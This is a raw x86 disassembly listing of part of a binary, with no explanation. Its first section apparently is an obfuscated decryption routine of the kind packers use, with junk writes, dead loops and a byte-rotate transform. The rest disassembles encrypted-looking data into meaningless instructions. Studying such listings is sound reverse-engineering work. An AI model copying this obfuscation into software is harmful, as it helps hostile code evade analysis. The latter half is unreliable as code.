  4038ec:	xchg   esi,eax
  4038ed:	push   es
  4038ee:	mov    WORD PTR [ecx],cs
  4038f0:	sbb    DWORD PTR [edi],edi
  4038f2:	jecxz  0x403942
  4038f4:	aad    0x29
  4038f6:	or     DWORD PTR [ebp+0x41],edx
  4038f9:	xor    al,0x60
  4038fb:	or     DWORD PTR [ebx],0x41
  4038fe:	add    al,0x43
  403900:	mov    fs,WORD PTR [eax-0xfb2745d]
  403906:	sub    DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xa2c4e32d,al
  403bc1:	in     al,0x6c
  403bc3:	shl    ah,0x9c
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	ficom  WORD PTR [esi-0x61]
  403bcf:	sahf   
  403bd0:	arpl   WORD PTR [eax],sp
  403bd2:	idiv   BYTE PTR [ebx-0x59]
  403bd5:	std    
  403bd6:	jae    0x403c4e
  403bd8:	dec    esi
  403bd9:	out    0x31,al
  403bdb:	leave  
  403bdc:	pusha  
  403bdd:	or     ecx,esi
  403bdf:	retf   
  403be0:	adc    cl,BYTE PTR [edx+0x616bc6ca]
  403be6:	mov    ebp,0xaffa6ef5
  403beb:	pop    edi
  403bec:	es popf 
  403bee:	inc    edi
  403bef:	add    DWORD PTR [eax+0x21],esp
  403bf2:	xchg   esp,eax
  403bf3:	addr16 cdq 
  403bf5:	inc    ebp
  403bf6:	pop    ebp
  403bf7:	mov    eax,0xd1f02e44
  403bfc:	jmp    0xba21:0x8145e1c8
  403c03:	fsubr  st(5),st
  403c05:	inc    BYTE PTR [ebx+ebx*8]
  403c08:	out    dx,eax
  403c09:	jecxz  0x403c66
  403c0b:	nop
  403c0c:	or     BYTE PTR [ecx-0x33dfa6a8],ch
  403c12:	and    DWORD PTR [edx+0x3c459b10],edi
  403c18:	push   eax
  403c19:	add    edi,ecx
  403c1b:	cmp    eax,edi
  403c1d:	shl    BYTE PTR [eax],cl
  403c1f:	popf   
  403c20:	jb     0x403c86
  403c22:	ins    BYTE PTR es:[edi],dx
  403c23:	adc    eax,0xc21678e7
  403c28:	sub    DWORD PTR [ebx],esp
  403c2a:	push   0x3f
  403c2c:	gs das 
  403c2e:	push   ss
  403c2f:	sub    ah,0x9f
  403c32:	js     0x403bdf
  403c34:	fnstcw WORD PTR ds:0x90fa9879
  403c3a:	(bad)  
  403c3b:	ss sub al,0xf5
  403c3e:	pop    eax
  403c3f:	sbb    esi,DWORD PTR [ecx]
  403c41:	adc    BYTE PTR [ebx-0x710ec359],0xe1
  403c48:	or     eax,0x7bf91cd
  403c4d:	jecxz  0x403c49
  403c4f:	das    
  403c50:	and    ecx,edi
  403c52:	dec    eax
  403c53:	retf   0x71ac
  403c56:	adc    al,0x54
  403c58:	adc    bl,BYTE PTR [ecx-0x72]
  403c5b:	xor    al,0x33
  403c5d:	stos   BYTE PTR es:[edi],al
  403c5e:	mov    edi,0xa02468bb
  403c63:	or     BYTE PTR [ecx],bh
  403c65:	lods   eax,DWORD PTR ds:[esi]
  403c66:	jecxz  0x403c83
  403c68:	push   0x5f
  403c6a:	mov    DWORD PTR [edx],ecx
  403c6c:	dec    ebx
  403c6d:	xor    DWORD PTR [esi],0x133a8b3a
  403c73:	retf   0x11f7
  403c76:	or     ah,bh
  403c78:	xchg   edi,eax
  403c79:	sti    
  403c7a:	xor    al,cl
  403c7c:	stos   DWORD PTR es:[edi],eax
  403c7d:	jmp    ebp
  403c7f:	stc    
  403c80:	sbb    DWORD PTR [ecx],esi
  403c82:	sub    BYTE PTR [ecx],0xaa
  403c85:	iret   
  403c86:	mov    ?,WORD PTR [esi]
  403c88:	pop    ecx
  403c89:	daa    
  403c8a:	or     ebp,DWORD PTR [ecx]
  403c8c:	popf   
  403c8d:	out    0xa8,eax
  403c8f:	inc    eax
  403c90:	mov    ecx,0xb1e69159
  403c95:	das    
  403c96:	mov    esi,0x89ba6d0d
  403c9b:	lods   al,BYTE PTR ds:[esi]
  403c9c:	jmp    0x403cf1
  403c9e:	jo     0x403d10
  403ca0:	int    0x1f
  403ca2:	or     DWORD PTR [esi],ecx
  403ca4:	inc    eax
  403ca5:	mov    BYTE PTR [ebp-0x60c9c710],0x5b
  403cac:	es std 
  403cae:	out    dx,al
  403caf:	mov    al,ds:0xfeaa2b35
  403cb4:	gs jnp 0x403cb7
  403cb7:	push   ecx
  403cb8:	gs iret 
  403cba:	adc    al,0xa8
  403cbc:	sti    
  403cbd:	push   es
  403cbe:	popa   
  403cbf:	sbb    ch,BYTE PTR [ebx]
  403cc1:	bound  edi,QWORD PTR [edx-0x4f]
  403cc4:	fucomi st,st(3)
  403cc6:	sti    
  403cc7:	push   0xba7f79e1
  403ccc:	inc    ebp
  403ccd:	dec    ecx
  403cce:	pop    ss
  403ccf:	popa   
  403cd0:	sub    ebx,eax
  403cd2:	jnp    0x403c7a
  403cd4:	and    eax,DWORD PTR [eax]
  403cd6:	pop    esp
  403cd7:	mov    edx,0x180674e7
  403cdc:	shr    BYTE PTR [edx],0xea
  403cdf:	stos   DWORD PTR es:[edi],eax
  403ce0:	dec    edx
  403ce1:	sbb    BYTE PTR [ebp+0x5668d5c7],dh
  403ce7:	dec    ebp
  403ce8:	cmp    ah,dl
  403cea:	xor    eax,DWORD PTR [edx+ebx*8-0x57]
  403cee:	jne    0x403c7d
  403cf0:	pop    edx
  403cf1:	push   edi
  403cf2:	inc    ebp
  403cf3:	push   cs
  403cf4:	test   ecx,ebp
  403cf6:	test   edx,eax
  403cf8:	xchg   ebx,eax
  403cf9:	arpl   WORD PTR ds:0x449cfdf3,bx
  403cff:	call   DWORD PTR [edi+0x125f11ab]
  403d05:	(bad)  
  403d06:	imul   esi,DWORD PTR [ebp+0x10459b61],0x3f
  403d0d:	fstp   TBYTE PTR [ebx+0x2fb7cc55]
  403d13:	out    0x63,al
  403d15:	sub    DWORD PTR [ecx],esp
  403d17:	inc    edi
  403d18:	or     BYTE PTR [edx+0x9],0x58
  403d1c:	ror    edi,0xa9
  403d1f:	cmp    edx,esi
  403d21:	push   0x60
  403d23:	dec    ecx
  403d24:	sbb    ebx,DWORD PTR [edi]
  403d26:	mov    ds,ecx
  403d28:	clc    
  403d29:	jno    0x403cba
  403d2b:	pop    esi
  403d2c:	inc    ebp
  403d2d:	sbb    DWORD PTR [eax],esi
  403d2f:	out    0xd6,al
  403d31:	imul   edi,esp,0xffffff9a
  403d34:	imul   edi,DWORD PTR [eax+0x7b],0xd14f9086
  403d3b:	dec    esp
  403d3c:	call   0xff950475
  403d41:	scas   al,BYTE PTR es:[edi]
  403d42:	out    0xb6,al
  403d44:	fldcw  WORD PTR [edx+0x2]
  403d47:	aad    0x42
  403d49:	ror    BYTE PTR [edi],0x97
  403d4c:	shr    BYTE PTR [ecx],cl
  403d4e:	cmp    al,0xea
  403d50:	xor    bh,0x31
  403d53:	pop    edx
  403d54:	or     DWORD PTR [ecx],eax
  403d56:	into   
  403d57:	into   
  403d58:	out    0xf6,eax
  403d5a:	xchg   edx,eax
  403d5b:	or     dh,ch
  403d5d:	sbb    esp,esi
  403d5f:	(bad)  
  403d60:	pop    ss
  403d61:	pop    esp
  403d62:	retf   
  403d63:	mov    dl,0x6e
  403d65:	add    eax,DWORD PTR [ebp-0x956df9b]
  403d6b:	inc    edx
  403d6c:	arpl   WORD PTR [ecx-0x40a25804],ax
  403d72:	sub    al,BYTE PTR [ebp+0xf]
  403d75:	inc    ebp
  403d76:	leave  
  403d77:	cmp    edi,0x5597eb88
  403d7d:	popa   
  403d7e:	inc    BYTE PTR [edx]
  403d80:	mov    dh,0x0
  403d82:	adc    BYTE PTR [edi],cl
  403d84:	test   BYTE PTR [esi-0x1c1aace2],bl
  403d8a:	dec    eax
  403d8b:	ins    DWORD PTR es:[di],dx
  403d8d:	push   cs
  403d8e:	cmp    esi,DWORD PTR [ecx+0x3ba60615]
  403d94:	push   ebp
  403d95:	fdivrp st(3),st
  403d97:	ds aas 
  403d99:	and    ah,al
  403d9b:	repz cmp DWORD PTR [ebx-0x13f63563],edx
  403da2:	mov    esi,0xc86586e0
  403da7:	push   esi
  403da8:	call   0x194cfea5
  403dad:	push   eax
  403dae:	scas   al,BYTE PTR es:[edi]
  403daf:	js     0x403d7b
  403db1:	mov    edx,0xff0f6555
  403db6:	cdq    
  403db7:	loope  0x403dee
  403db9:	int3   
  403dba:	mov    cl,dh
  403dbc:	bswap  eax
  403dbe:	lock shl BYTE PTR [edx-0x57],cl
  403dc2:	cmp    al,BYTE PTR [edi+0x6521c4c2]
  403dc8:	fdivr  st,st(4)
  403dca:	mov    bl,0xf0
  403dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dcd:	pop    edx
  403dce:	lahf   
  403dcf:	call   0x2d619c7b
  403dd4:	enter  0x43f2,0x53
  403dd8:	retf   
  403dd9:	mov    ds:0x48036a59,al
  403dde:	xchg   ebp,eax
  403ddf:	push   edx
  403de0:	mov    dl,0x2b
  403de2:	scas   al,BYTE PTR es:[edi]
  403de3:	add    BYTE PTR [ebp-0x2],bl
  403de6:	xchg   cl,bh
  403de8:	inc    BYTE PTR [edi]
  403dea:	dec    edx
  403deb:	xor    al,0x99
  403ded:	sbb    DWORD PTR [esi+0x4d21121c],eax
  403df3:	dec    ebp
  403df4:	adc    DWORD PTR [edi-0x7c],ebx
  403df7:	je     0x403dd9
  403df9:	or     ah,BYTE PTR [ebp-0x48]
  403dfc:	data16 sti 
  403dfe:	in     al,dx
  403dff:	sti    
  403e00:	jne    0x403e11
  403e02:	ficomp DWORD PTR [edi-0x36]
  403e05:	push   eax
  403e06:	adc    eax,0x656b7155
  403e0b:	lds    ecx,FWORD PTR [ebx-0x6d]
  403e0e:	aam    0x8d
  403e10:	mov    dl,0xa5
  403e12:	mov    al,0x1b
  403e14:	sbb    DWORD PTR [ebp-0x1c7f865a],edi
  403e1a:	cli    
  403e1b:	sbb    dh,ch
  403e1d:	sahf   
  403e1e:	xor    DWORD PTR [esi-0x31824a91],edi
  403e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e25:	inc    ebp
  403e26:	dec    edi
  403e27:	push   ss
  403e28:	adc    BYTE PTR [ebp-0x50],bh
  403e2b:	lock test eax,0x6bb3329a
  403e31:	das    
  403e32:	jns    0x403e63
  403e34:	neg    ebp
  403e36:	or     BYTE PTR [esi+0x67],dh
  403e39:	scas   eax,DWORD PTR es:[edi]
  403e3a:	loope  0x403e03
  403e3c:	les    ebx,FWORD PTR [esi]
  403e3e:	not    ecx
  403e40:	clc    
  403e41:	sub    DWORD PTR [eax],edi
  403e43:	dec    edx
  403e44:	xor    BYTE PTR cs:[eax],dh
  403e47:	jmp    0x7d34:0x7406f148
  403e4e:	scas   al,BYTE PTR es:[edi]
  403e4f:	add    al,0x2d
  403e51:	dec    edx
  403e52:	sar    BYTE PTR [ebp+0x21],0xe1
  403e56:	push   edi
  403e57:	retf   0x9861
  403e5a:	mov    al,ds:0xbae52a85
  403e5f:	call   DWORD PTR [esi+0x646b8897]
  403e65:	pop    edx
  403e66:	inc    esp
  403e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e68:	mov    BYTE PTR [edx+0x6f],ch
  403e6b:	sub    bl,BYTE PTR [esi-0x25]
  403e6e:	sub    BYTE PTR [edi],ch
  403e70:	xor    BYTE PTR [ecx+0x5681b9d9],0x78
  403e77:	cwde   
  403e78:	out    dx,al
  403e79:	data16 hlt 
  403e7b:	sbb    al,0xe0
  403e7d:	push   cs
  403e7e:	jp     0x403e50
  403e80:	xchg   DWORD PTR [eax-0x18fbf91f],edi
  403e86:	mov    ebx,0x3d6e7b51
  403e8b:	nop
  403e8c:	enter  0xa9fb,0xa9
  403e90:	or     al,0x14
  403e92:	pop    ds
  403e93:	test   BYTE PTR [eax-0xc],bh
  403e96:	fmul   DWORD PTR [esi-0x4feb270f]
  403e9c:	mov    ch,0xc8
  403e9e:	(bad)  
  403e9f:	hlt    
  403ea0:	mov    bl,BYTE PTR [ecx-0xa22800e]
  403ea6:	mov    WORD PTR [esi-0x5c],gs
  403ea9:	shr    BYTE PTR [edx+0x68],cl
  403eac:	add    bh,cl
  403eae:	inc    edx
  403eaf:	mov    esp,0x32d3215d
  403eb4:	mov    bl,0xdc
  403eb6:	fcom   QWORD PTR ds:0x6364f109
  403ebc:	push   esp
  403ebd:	cwde   
  403ebe:	ret    0xaaf1
  403ec1:	inc    ebp
  403ec2:	movlps QWORD PTR [ebx],xmm3
  403ec5:	(bad)  
  403ec6:	xor    DWORD PTR [edi+0x7a],edx
  403ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eca:	jp     0x403ed1
  403ecc:	or     al,0x79
  403ece:	fs xchg edx,eax
  403ed0:	xchg   ebx,eax
  403ed1:	inc    esi
  403ed2:	jg     0x403e5a
  403ed4:	mov    cl,0x68
  403ed6:	cmp    al,0x80
  403ed8:	pop    esi
  403ed9:	push   ss
  403eda:	push   ds
  403edb:	push   edx
  403edc:	outs   dx,BYTE PTR ds:[esi]
  403edd:	mov    cl,0x38
  403edf:	mov    al,ah
  403ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ee2:	jp     0x403f0c
  403ee4:	retf   0x90e5
  403ee7:	push   es
  403ee8:	ret    0xc168
  403eeb:	lock dec ebp
  403eed:	bound  esp,QWORD PTR [ebp+0x2ddc8d76]
  403ef3:	mov    eax,0xfce51d70
  403ef8:	add    al,BYTE PTR gs:[edx-0x663bcf56]
  403eff:	imul   edi,DWORD PTR [ebp+0x7f24f64b],0x3873cd73
  403f09:	gs adc bh,ah
  403f0c:	mov    esi,0xdaf967c1
  403f11:	dec    ebp
  403f12:	aam    0x9c
  403f14:	xchg   ebp,eax
  403f15:	sub    al,0xb5
  403f17:	and    al,BYTE PTR [edi-0x54]
  403f1a:	ror    esp,1
  403f1c:	sbb    al,0x9
  403f1e:	jb     0x403eb1
  403f20:	test   eax,0x9ebb3f86
  403f25:	or     DWORD PTR [edx+0x71],edx
  403f28:	dec    edx
  403f29:	add    eax,DWORD PTR [ecx-0x56]
  403f2c:	stos   DWORD PTR es:[edi],eax
  403f2d:	js     0x403f68
  403f2f:	iret   
  403f30:	add    edx,eax
  403f32:	push   0xcec5bfd1
  403f37:	test   eax,0x1b6337f5
  403f3c:	inc    esi
  403f3d:	xor    eax,0xf21e1d27
  403f42:	sbb    eax,0xc15dc410
  403f47:	enter  0x6f2c,0x55
  403f4b:	adc    DWORD PTR [eax-0x55],ebp
  403f4e:	cmp    BYTE PTR [ebx+0x1b],bh
  403f51:	and    dh,BYTE PTR [ebp+ebp*2-0x57f29664]
  403f58:	aad    0xcb
  403f5a:	mov    edx,0xea3facb8
  403f5f:	in     al,dx
  403f60:	add    BYTE PTR [edi-0x18],0x88
  403f64:	call   FWORD PTR [edi+0x7abfb91c]
  403f6a:	icebp  
  403f6b:	push   eax
  403f6c:	ret    
  403f6d:	loope  0x403f28
  403f6f:	inc    esi
  403f70:	pop    eax
  403f71:	ror    DWORD PTR ss:[edx],0xae
  403f75:	addr16 push eax
  403f77:	sahf   
  403f78:	adc    eax,DWORD PTR [eax-0xe]
  403f7b:	push   0xffffffdf
  403f7d:	fstp   TBYTE PTR [ebx+0x2d129a5]
  403f83:	xchg   esp,eax
  403f84:	xchg   dl,cl
  403f86:	shl    DWORD PTR [esi],cl
  403f88:	xor    eax,ebp
  403f8a:	add    eax,0x4be4dec4
  403f8f:	push   cs
  403f90:	sbb    al,0xf4
  403f92:	dec    ebx
  403f93:	repnz mov esi,0x1df9d0c
  403f99:	test   DWORD PTR [ebx-0x4d358ddb],ebp
  403f9f:	xor    eax,0x760bdaf
  403fa4:	stc    
  403fa5:	mov    ebx,0x1b7f3b6b
  403faa:	adc    DWORD PTR [edx-0x46bad14],edx
  403fb0:	in     al,dx
  403fb1:	jmp    0x403fd2
  403fb3:	xor    DWORD PTR [ebx],ebp
  403fb5:	dec    ebp
  403fb6:	pushf  
  403fb7:	hlt    
  403fb8:	test   BYTE PTR [edx+0x22],bl
  403fbb:	stos   BYTE PTR es:[edi],al
  403fbc:	mov    cl,0xee
  403fbe:	and    eax,0xac73ae1e
  403fc3:	std    
  403fc4:	fninit 
  403fc6:	mov    ds:0xcd84feba,al
  403fcb:	push   esi
  403fcc:	test   edx,ecx
  403fce:	fcmovnbe st,st(3)
  403fd0:	data16 jge 0x404010
  403fd3:	lahf   
  403fd4:	cmc    
  403fd5:	and    al,0xb0
  403fd7:	jae    0x403f7c
  403fd9:	sub    ebp,ebp
  403fdb:	rcr    edi,1
  403fdd:	test   BYTE PTR gs:[ecx+ecx*1+0x31a28e32],dh
  403fe5:	dec    ebx
  403fe6:	mov    ebx,0x321487d2
  403feb:	fild   QWORD PTR [ebx]
  403fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fee:	push   ebx
  403fef:	cli    
  403ff0:	fadd   QWORD PTR [edi+0x45043dca]
  403ff6:	jnp    0x403fee
  403ff8:	and    al,0xe1
  403ffa:	out    0xa9,eax
  403ffc:	inc    esp
  403ffd:	(bad)  
  403ffe:	jmp    0xea8a:0x1ff9ae3c
  404005:	and    dh,BYTE PTR [esi]
  404007:	cmp    al,0xb5
  404009:	xchg   edi,eax
  40400a:	pusha  
  40400b:	and    BYTE PTR [esp+edi*2+0x54],bh
  40400f:	int3   
  404010:	push   esp
  404011:	loope  0x403fe8
  404013:	scas   al,BYTE PTR es:[edi]
  404014:	xor    al,BYTE PTR [ecx*8+0x6f2ff2a7]
  40401b:	js     0x404019
  40401d:	mov    ecx,0xdd3d377a
  404022:	mov    ebx,0x580334a6
  404027:	pop    ebx
  404028:	inc    edx
  404029:	jnp    0x404079
  40402b:	jge    0x40403c
  40402d:	or     ah,BYTE PTR [esi+0xe]
  404030:	lods   al,BYTE PTR ds:[esi]
  404031:	(bad)  
  404032:	xor    BYTE PTR [edx+0x28f2f0e2],ah
  404038:	dec    ebp
  404039:	and    al,0x60
  40403b:	jge    0x404006
  40403d:	jg     0x403fe8
  40403f:	imul   edx,edi,0xffffffc1
  404042:	pop    ebp
  404043:	in     al,0x84
  404045:	mov    eax,0xb6be4888
  40404a:	addr16 cmp eax,0xbe375bec
  404050:	and    BYTE PTR [edx],cl
  404052:	int3   
  404053:	mov    edi,0xc0e9fd81
  404058:	dec    ebx
  404059:	mov    edx,0xb40b2ae3
  40405e:	dec    edx
  40405f:	outs   dx,BYTE PTR ds:[esi]
  404060:	rol    DWORD PTR [edx+0x3c3804d4],1
  404066:	mov    eax,ds:0xeec6174e
  40406b:	xchg   edi,eax
  40406c:	jecxz  0x40402b
  40406e:	inc    ebx
  40406f:	sar    BYTE PTR [esi+0x2a232013],1
  404075:	lods   eax,DWORD PTR ds:[esi]
  404076:	jbe    0x4040cb
  404078:	sbb    DWORD PTR [esi-0x42],ebp
  40407b:	(bad)  
  40407c:	sub    ebp,ecx
  40407e:	mov    dl,0xcc
  404080:	push   esp
  404081:	jb     0x4040ea
  404083:	icebp  
  404084:	jp     0x40405a
  404086:	jmp    0x404025
  404088:	inc    ecx
  404089:	sub    dh,bh
  40408b:	push   ds
  40408c:	xor    DWORD PTR [esi],0x551ec8f1
  404092:	inc    esp
  404093:	outs   dx,BYTE PTR ds:[esi]
  404094:	add    edi,DWORD PTR [eax-0x1fd7d0e9]
  40409a:	or     eax,0x5ecf8d7a
  40409f:	fisttp WORD PTR [edx]
  4040a1:	fcmovbe st,st(4)
  4040a3:	stos   DWORD PTR es:[edi],eax
  4040a4:	mov    edx,0x23d45f8e
  4040a9:	inc    edi
  4040aa:	sub    dl,BYTE PTR [esi]
  4040ac:	ror    BYTE PTR [ebx+0x7f],0x87
  4040b0:	inc    edx
  4040b1:	fisubr WORD PTR [ecx+0x41038f1a]
  4040b7:	stc    
  4040b8:	(bad)  
  4040b9:	sbb    edx,esi
  4040bb:	cmp    BYTE PTR [esi-0x3e73ac93],dl
  4040c1:	pop    esi
  4040c2:	push   ds
  4040c3:	adc    al,0x46
  4040c5:	adc    al,0xb6
  4040c7:	ja     0x4040ec
  4040c9:	lds    ecx,FWORD PTR [ebp-0x46]
  4040cc:	xchg   edx,eax
  4040cd:	sar    BYTE PTR [edx+0x7babb8b1],cl
  4040d3:	in     eax,0x4d
  4040d5:	or     bl,bl
  4040d7:	pushf  
  4040d8:	fnsave [esi-0x3f]
  4040db:	push   ebp
  4040dc:	ins    DWORD PTR es:[edi],dx
  4040dd:	(bad)  
  4040df:	xor    eax,0xde56f332
  4040e4:	cdq    
  4040e5:	push   eax
  4040e6:	adc    BYTE PTR [edx-0x54ed5b32],cl
  4040ec:	xor    al,ch
  4040ee:	out    dx,eax
  4040ef:	or     DWORD PTR [edx],ebp
  4040f1:	int3   
  4040f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040f3:	xor    BYTE PTR [eax],dl
  4040f5:	or     DWORD PTR [ebx+0x70],edx
  4040f8:	cwde   
  4040f9:	dec    ebp
  4040fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040fb:	popa   
  4040fc:	or     al,0x37
  4040fe:	xchg   BYTE PTR [edi+0x6],bh
  404101:	test   al,0x1a
  404103:	mov    ebp,0x90acb603
  404108:	push   es
  404109:	js     0x404134
  40410b:	cli    
  40410c:	aas    
  40410d:	lea    ecx,[edi-0x792b642a]
  404113:	xchg   ebp,eax
  404114:	outs   dx,BYTE PTR ds:[esi]
  404115:	pop    eax
  404116:	into   
  404117:	inc    edi
  404118:	sub    ebx,edi
  40411a:	ja     0x40419a
  40411c:	sub    BYTE PTR [edx],0x53
  40411f:	dec    ebp
  404120:	mov    eax,0x30acf457
  404125:	hlt    
  404126:	outs   dx,DWORD PTR ds:[esi]
  404127:	mov    ecx,0x77fe8f28
  40412c:	pop    ss
  40412d:	mov    eax,ds:0x799e78ef
  404132:	jl     0x4040c5
  404134:	xor    eax,0x619dbe71
  404139:	lea    ebx,[eax+edx*8+0x34]
  40413d:	jne    0x404158
  40413f:	adc    ch,BYTE PTR [esi+0x3824b08c]
  404145:	add    al,0xce
  404147:	inc    esp
  404148:	leave  
  404149:	outs   dx,DWORD PTR ds:[esi]
  40414a:	pop    edx
  40414b:	cmp    al,BYTE PTR [ebx+0x323880dd]
  404151:	retf   0x6b98
  404154:	mov    bh,0x7b
  404156:	fidiv  DWORD PTR [edx-0x67]
  404159:	repz mov ebx,0xcec7956e
  40415f:	out    0xcf,al
  404161:	cdq    
  404162:	into   
  404163:	(bad)
  404166:	in     eax,dx
  404167:	xlat   BYTE PTR ds:[ebx]
  404168:	jecxz  0x4041c8
  40416a:	(bad)  
  40416b:	mov    ds:0x8631917b,eax
  404170:	int    0xe5
  404172:	inc    edx
  404173:	out    dx,eax
  404174:	(bad)  
  404175:	jl     0x404170
  404177:	pop    edx
  404178:	mov    ecx,0x938efb63
  40417d:	rcl    BYTE PTR [esi+eiz*1],1
  404180:	mov    al,0x1e
  404182:	or     al,0x86
  404184:	pop    ebx
  404185:	popf   
